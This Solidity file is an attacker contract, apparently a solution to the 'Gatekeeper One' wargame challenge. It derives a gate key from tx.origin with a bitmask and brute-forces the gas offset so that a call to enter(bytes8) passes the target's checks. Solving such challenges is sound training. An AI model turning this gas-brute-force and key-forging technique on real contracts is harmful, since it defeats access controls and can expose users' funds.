pragma solidity ^0.8.0;

contract GatekeeperOneAttacker {

    function attack(address gatekeeper) public {
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF ;
        for (uint i = 0; i < 8191; i++) {
            (bool status,) = gatekeeper.call{gas: i + 8191 * 3}(abi.encodeWithSignature("enter(bytes8)", gateKey));
            if (status) {
                break;
            }
        }
    }
}